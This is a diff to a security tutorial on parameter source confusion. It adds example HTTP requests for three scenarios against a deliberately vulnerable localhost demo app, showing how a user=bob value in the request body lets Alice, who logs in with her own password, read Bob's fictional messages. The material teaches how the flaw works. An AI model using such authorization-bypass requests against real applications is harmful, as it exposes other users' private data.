@@ -91,13 +91,16 @@ def example1():
 Request:
 
 ```http
-# Expected Usage
-GET /example1?user=alice&password=123456
+# Expected Usage:
+GET http://localhost:8000/vuln/confusion/parameter-source/example1?user=alice&password=123456
+Content-Type: application/x-www-form-urlencoded
+
+user=alice
+###
 
 # Attack
-GET /vuln/confusion/parameter-source/example1?user=alice&password=123456 HTTP/1.1
+GET http://localhost:8000/vuln/confusion/parameter-source/example1?user=alice&password=123456 HTTP/1.1
 Content-Type: application/x-www-form-urlencoded
-Content-Length: 8
 
 user=bob
 ```
@@ -136,6 +139,46 @@ def example2():
     return messages
 ```
 
+Request:
+
+```http
+# Expected Usage:
+GET http://localhost:8000/vuln/confusion/parameter-source/example2?user=alice&password=123456
+Content-Type: application/x-www-form-urlencoded
+
+user=alice
+#
+# Normally, Alice would get her *own* messages:
+#
+# [
+#  {
+#    "from": "kevin",
+#    "message": "Hi Alice, you're fired!"
+#  }
+# ]
+#
+###
+
+# Attack
+GET http://localhost:8000/vuln/confusion/parameter-source/example2?user=alice&password=123456 HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+
+user=bob
+#
+# Alice gets Bob's messages, even though she provided her own password!
+#
+# [
+#  {
+#    "from": "kevin",
+#    "message": "Hi Bob, here is the password you asked for: P@ssw0rd!"
+#  },
+#  {
+#    "from": "michael",
+#    "message": "Hi Bob, come to my party on Friday! The secret passphrase is 'no-one-knows-it'!"
+#  }
+# ]
+```
+
 ### Example 3: Cross-Module Parameter Source Confusion
 
 In the previous example, you can still see that the `user` value gets retrieved from the
@@ -163,6 +206,49 @@ def example3():
 
     return messages
 ```
+
+Requests:
+
+<details>
+<summary>See HTTP Requests</summary>
+```http
+# Expected Usage:
+GET http://localhost:8000/vuln/confusion/parameter-source/example3?user=alice&password=123456
+Content-Type: application/x-www-form-urlencoded
+
+user=alice
+#
+# Normally, Alice would get her *own* messages:
+#
+# [
+#  {
+#    "from": "kevin",
+#    "message": "Hi Alice, you're fired!"
+#  }
+# ]
+#
+###
+
+# Attack
+GET http://localhost:8000/vuln/confusion/parameter-source/example3?user=alice&password=123456 HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+
+user=bob
+#
+# Alice gets Bob's messages, even though she provided her own password!
+#
+# [
+#  {
+#    "from": "kevin",
+#    "message": "Hi Bob, here is the password you asked for: P@ssw0rd!"
+#  },
+#  {
+#    "from": "michael",
+#    "message": "Hi Bob, come to my party on Friday! The secret passphrase is 'no-one-knows-it'!"
+#  }
+# ]
+```
+</details>
 
 ## Source Merging in Custom Helper Function
 
